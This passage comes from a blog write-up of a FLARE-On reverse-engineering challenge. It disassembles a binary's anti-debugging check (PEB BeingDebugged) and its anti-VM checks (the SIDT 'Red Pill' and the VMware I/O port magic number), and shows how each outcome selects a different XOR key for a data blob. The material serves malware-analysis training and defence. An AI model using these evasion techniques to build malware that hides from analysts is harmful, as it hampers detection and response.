</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4010C0</span>    <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401130</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4011D0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4012A0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401350</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4013F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Let's forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting <code>var_4</code> to zero. The next jump will only happen if <code>var_4</code> is zero which means that the last jump should not have happened. If the first compare succeeds (meaning <code>[eax+2]</code> is 1) then we go left and otherwise right.</p><p><img src=/images/2014/flare/7-4.jpg alt=BeingDebugged title=BeingDebugged></p><p>In both cases a string <code>UNACCEPTABLE!</code> or <code>omglob</code> are loaded along with address <code>byte_4131F8</code> before a function call <code>sub_401000</code>. The address points to a long stream of data.</p><p><img src=/images/2014/flare/7-5.jpg alt=blob title=blob></p><p>Looking inside <code>sub_401000</code>. At the start <code>blob_length</code> is loaded into <code>ecx</code>. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>UNACCEPTABLE!</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. So <code>sub_401000</code> is <code>string xor blob</code>.</p><p><img src=/images/2014/flare/7-6.jpg alt="xor function" title="xor function"></p><p>Now let's go back to the first compare.</p><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:004010<span style=color:#268bd2>C6</span> <span style=color:#268bd2>mov</span>     [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_4</span>], <span style=color:#2aa198>1</span>
</span></span><span style=display:flex><span>.text:004010<span style=color:#268bd2>CD</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#268bd2>large</span> <span style=color:#b58900>fs</span>:<span style=color:#2aa198>30h</span>
</span></span><span style=display:flex><span>.text:004010<span style=color:#268bd2>D3</span> <span style=color:#268bd2>cmp</span>     <span style=color:#dc322f>byte</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>eax</span><span style=color:#719e07>+</span><span style=color:#2aa198>2</span>], <span style=color:#2aa198>1</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>What is the significance of <code>fs:30h</code>? It is the <code>Process Environment Block (PEB)</code> in the <code>Thread Information Block (TIB)</code>. According to <a href="http://msdn.microsoft.com/en-gb/library/windows/desktop/aa813706%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">MSDN</a> it has the following structure. The application is comparing the 3rd byte with 1. The 3rd byte is called <code>BeingDebugged</code> and is set to 1 if the application is being debugged. If we are running the application with a debugger it will be set to 1 and <code>UNACCEPTABLE!</code> will be xor-ed with the <code>blob</code> otherwise <code>omglob</code>. More information about the <code>PEB</code> can be found in the first section of the PDF <code>1.NtGlobalFlag</code>.</p><figure class=code><figcaption><span>PEB Structure</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#719e07>typedef</span> <span style=color:#719e07>struct</span> <span style=color:#268bd2>_PEB</span> {
</span></span><span style=display:flex><span>  BYTE                          Reserved1[<span style=color:#2aa198>2</span>];
</span></span><span style=display:flex><span>  BYTE                          BeingDebugged;
</span></span><span style=display:flex><span>  BYTE                          Reserved2[<span style=color:#2aa198>1</span>];
</span></span><span style=display:flex><span>  PVOID                         Reserved3[<span style=color:#2aa198>2</span>];
</span></span><span style=display:flex><span>  PPEB_LDR_DATA                 Ldr;
</span></span><span style=display:flex><span>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
</span></span><span style=display:flex><span>  BYTE                          Reserved4[<span style=color:#2aa198>104</span>];
</span></span><span style=display:flex><span>  PVOID                         Reserved5[<span style=color:#2aa198>52</span>];
</span></span><span style=display:flex><span>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
</span></span><span style=display:flex><span>  BYTE                          Reserved6[<span style=color:#2aa198>128</span>];
</span></span><span style=display:flex><span>  PVOID                         Reserved7[<span style=color:#2aa198>1</span>];
</span></span><span style=display:flex><span>  ULONG                         SessionId;
</span></span><span style=display:flex><span>} PEB, <span style=color:#719e07>*</span>PPEB;</span></span></code></pre></td></tr></table></div></div></div></figure><p>At this point we can rewrite this function in Python</p><figure class=code><figcaption><span>BeingDebugged</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (BeingDebugged):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;UNACCEPTBALE!&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;omglob&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-3---vmware-detection-via-red-pill>Function 3 - VMware Detection via Red Pill
<a class=header-link href=#function-3---vmware-detection-via-red-pill><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>calls_isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401130</span>       <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4011D0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4012A0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401350</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4013F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/7-7.jpg alt="SIDT Red Pill" title="SIDT Red Pill"></p><p>Jumping into <code>sub_401130</code> we see an old anti-VM technique. This is called <a href=http://repo.hackerzvoice.net/depot_ouah/Red_%20Pill.html target=_blank rel="noreferrer noopener">The Red Pill</a>. Each CPU core has its own <code>Interrupt Descriptor Table (IDT}</code>. IDT is essentially an interrupt vector table. Because the VM manager is juggling two operating systems but there is one location per core, it has to relocate IDT of guest OS in memory. The application can check this location for known addresses assigned by VM managers and determine if it is running in a VM.</p><p>But how is this accomplished? Each core has one register called the <code>Interrupt Descriptor Table Register (IDTR)</code> that points to this location in memory. The userland (ring3) instruction<code>SIDT</code> will save this register. VM managers store the relocated tables in different places and the value of this register can act as a VM manager fingerprint.</p><p>According to <a href=http://vrt-blog.snort.org/2009/10/how-does-malware-know-difference.html target=_blank rel="noreferrer noopener">this post</a> by Alain Zidouemba these are some of the addresses:</p><pre><code>|
| VM Manager |   Address  |
|------------|------------|
| Windows    | 0x80FFFFFF |
| Virtual PC | 0xE8XXXXXX |
| VMware     | 0xFFXXXXXX |
|
</code></pre><figure class=code><figcaption><span>SIDT Red Pill</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">8
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401138 <span style=color:#268bd2>sidt</span>    <span style=color:#268bd2>fword</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_8</span>]
</span></span><span style=display:flex><span>.text:0040113<span style=color:#268bd2>C</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>edi</span>, <span style=color:#dc322f>dword</span> <span style=color:#268bd2>ptr</span> [<span style=color:#b58900>ebp</span><span style=color:#719e07>+</span><span style=color:#268bd2>var_8</span><span style=color:#719e07>+</span><span style=color:#2aa198>2</span>] <span style=color:#586e75>; edi = IDT address (in this run 0xBAB3C590)</span>
</span></span><span style=display:flex><span>.text:0040113<span style=color:#268bd2>F</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>esi</span>, <span style=color:#b58900>bl</span><span style=color:#268bd2>ob_length</span> <span style=color:#586e75>; 0x106240</span>
</span></span><span style=display:flex><span>.text:00401145 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#b58900>edi</span>                     <span style=color:#586e75>; eax = edi = IDT address</span>
</span></span><span style=display:flex><span>.text:00401147 <span style=color:#268bd2>and</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>0FF000000h</span>              <span style=color:#586e75>; Getting the first byte of address</span>
</span></span><span style=display:flex><span>.text:0040114<span style=color:#268bd2>C</span> <span style=color:#268bd2>xor</span>     <span style=color:#b58900>ecx</span>, <span style=color:#b58900>ecx</span>
</span></span><span style=display:flex><span>.text:0040114<span style=color:#268bd2>E</span> <span style=color:#268bd2>cmp</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>0FF000000h</span>              <span style=color:#586e75>; Comparing the first byte with 0xFF</span>
</span></span><span style=display:flex><span>.text:00401153 <span style=color:#268bd2>jnz</span>     <span style=color:#268bd2>short</span> <span style=color:#268bd2>loc_40119A</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>The above compares the first byte of IDT address with <code>0xFF</code>. According to our table it is looking for <code>VMware</code>. But we are not running it. If this check passes (meaning we are not running VMware) the string <code>you're so bad</code> is going to be xor-ed with the blob, otherwise it will be <code>you're so good</code>. The address <code>0xBAB3C590</code> did not change during my runs in one VM. I will have to try with a different VM in VirtualBox to see if it changes or if it has a pattern. If you know please let me know.</p><figure class=code><figcaption><span>VMware Detection via Red Pill</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (running_in_vmware):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;you&#39;re so good&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;you&#39;re so bad&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-4---vmware-detection-2-electric-boogaloo>Function 4 - VMware Detection 2: Electric Boogaloo
<a class=header-link href=#function-4---vmware-detection-2-electric-boogaloo><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>isDebuggerPresent</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>BeingDebugged</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>VMware_detection</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4011D0</span>       <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4012A0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401350</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4013F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>What's in the box?</p><p><img src=/images/2014/flare/7-8.jpg alt="VMware detection 2" title="VMware detection 2"></p><p>Function will create its own exception handler, it will return the execution to <code>loc_401232</code> if an exception occurs. Then we have some interesting instructions. If we look at the <a href=https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/ target=_blank rel="noreferrer noopener">Malware Bytes</a> article, it is named <code>VMware I/O port</code>. These are the magic instructions:</p><figure class=code><figcaption><span>VMware I/O port check</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:0040120<span style=color:#268bd2>E</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, <span style=color:#2aa198>564D5868h</span>   <span style=color:#586e75>; save magic number to eax</span>
</span></span><span style=display:flex><span>.text:00401213 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>ecx</span>, <span style=color:#2aa198>0Ah</span>
</span></span><span style=display:flex><span>.text:00401218 <span style=color:#268bd2>mov</span>     <span style=color:#b58900>dx</span>, <span style=color:#2aa198>5658h</span>
